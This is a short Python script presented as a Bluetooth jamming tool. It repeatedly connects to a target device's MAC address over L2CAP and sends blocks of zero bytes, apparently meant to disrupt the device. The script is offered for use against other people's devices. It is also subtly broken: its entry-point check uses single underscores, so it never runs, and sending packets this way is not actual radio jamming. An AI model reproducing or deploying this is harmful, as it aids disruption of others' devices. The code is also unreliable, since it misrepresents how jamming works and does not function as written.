import bluetooth
import time
import argparse

def jam_bluetooth(target_device, jamming_duration, jamming_interval):
    print("Starting Bluetooth jamming...")
    start_time = time.time()

    while time.time() - start_time < jamming_duration:
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.connect((target_device, 1))
            sock.send(b"\x00" * 1024)  # Send a large packet of zeros
            sock.close()

            print("Jammed a packet to:", target_device)
            time.sleep(jamming_interval)
        except Exception as e:
            print("Error:", e)
            break

    print("Bluetooth jamming completed.")

def main():
    parser = argparse.ArgumentParser(description="Bluetooth Jamming Tool")
    parser.add_argument("target_device", help="MAC address of the target Bluetooth device")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Jamming duration in seconds")
    parser.add_argument("-i", "--interval", type=int, default=1, help="Jamming interval in seconds")

    args = parser.parse_args()

    jam_bluetooth(args.target_device, args.duration, args.interval)

if _name_ == "_main_":
    main()
